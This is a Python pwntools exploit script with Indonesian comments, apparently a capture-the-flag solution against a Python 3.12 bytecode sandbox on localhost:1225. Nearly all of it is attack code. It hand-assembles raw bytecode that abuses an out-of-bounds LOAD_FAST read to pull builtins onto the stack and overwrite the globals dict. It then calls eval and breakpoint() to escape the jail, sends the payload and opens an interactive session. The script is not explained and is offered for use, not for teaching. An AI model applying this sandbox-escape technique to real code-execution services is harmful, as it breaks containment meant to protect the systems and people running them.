from pwn import *
from dis import dis, _all_opmap as opmap
# https://docs.python.org/3.12/library/dis.html#python-bytecode-instructions
# Ini ada OOB di LOAD_FAST cuma dia beda tiap program?????
# Kalo di challenge file dia ada di index 42 ('*')
BUILTINS_INDEX = 42
LOAD_FAST = opmap['LOAD_FAST']
LOAD_GLOBAL = opmap['LOAD_GLOBAL']
RETURN_VALUE = opmap['RETURN_VALUE']
DELETE_SUBSCR = opmap['DELETE_SUBSCR']
STORE_FAST = opmap['STORE_FAST']
BUILD_MAP = opmap['BUILD_MAP']
LAE = opmap['LOAD_ASSERTION_ERROR']
FOR_ITER = opmap['FOR_ITER']
GET_ITER = opmap['GET_ITER']
LOAD_CONST = 100
CALL_NO_KW_STR_1 = opmap['CALL_NO_KW_STR_1']
SWAP = opmap['SWAP']
UNPACK_EX = opmap['UNPACK_EX']
MATCH_KEYS = opmap['MATCH_KEYS']
UNPACK_EX2 = b'^x'               # UNPACK_EX atau star (*x) basically *x trus unpacked valuesnya ada 120 ord('x')
SWAP_STACK = b'cy'              # Swap stack[-121] dengan TOS
POP = b'#;Y;Y;'                 # POP
BUILD_TUPLE2 = b'fx'             # Make a 120 sized tuple
BUILD_TUPLE = opmap['BUILD_TUPLE']
DUMP_TO_STACK = b'!;^x'         # MATCH_KEYS -> UNPACK_EX (sekarang 120 values builtin ada di stack)
CALL_NO_KW_BUILTIN_FAST = opmap['CALL_NO_KW_BUILTIN_FAST']
STORE_SUBSCR = opmap['STORE_SUBSCR']
context.log_level = 'critical'

code = bytes([
    ### Load builtins
    LOAD_FAST, 60,
    LOAD_FAST, 60,
    UNPACK_EX, 61,
    SWAP, 62,
    *POP, 
    BUILD_TUPLE, 61,
    MATCH_KEYS, 61,
    UNPACK_EX, 61,              # Now we have builtin functions on the stack

    *((LOAD_FAST, 36)*30),      # LOAD_FAST spray to get more shit
    SWAP, 100,                  # globals dict 
    STORE_FAST, 32,
    
    # Load builtins again to fill in globals dict
    LOAD_FAST, 125,
    UNPACK_EX, 32,
    
    # Fill in globals dict with random values using STORE_SUBSCR
    *((
        STORE_FAST, 55,
        STORE_FAST, 56,
        LOAD_FAST, 55,
        LOAD_FAST, 32,
        LOAD_FAST, 56,
        STORE_SUBSCR, 42,
        33,33,                  # cache 
    )*23),

    ### Globals and builtins shenanigans
    SWAP, 59,                   # eval
    LOAD_FAST, 32,  
    LOAD_FAST, 32,
    UNPACK_EX, 32,
    SWAP, 33,
    *POP,
    BUILD_TUPLE, 32,
    MATCH_KEYS, 32,
    UNPACK_EX, 32,
    *(POP*20), 
    STORE_FAST, 59,             # payload
    *(POP),
    STORE_FAST, 33,             # gadget
    *(POP*12),
    STORE_FAST, 34,

    ### Execute breakpoint()
    LOAD_FAST, 33,
    LOAD_FAST, 34,
    LOAD_FAST, 59,
    *((LAE,32)*31),
    CALL_NO_KW_BUILTIN_FAST, 32,
    32,32,32,32,32,32,          # Needs 3 caches for some reason

    RETURN_VALUE, 32,
])


payload = open('payload', 'w')
payload.write(code.decode())
payload.close()
p = remote('localhost', 1225)
p.sendlineafter(b'ka?', b'breakpoint()#' + ''.join(set(code.decode())).encode())
print(b'breakpoint()#' + ''.join(set(code.decode())).encode())
p.sendline(code)


p.interactive()
res = p.recvall(timeout=0.1).decode()
print(res)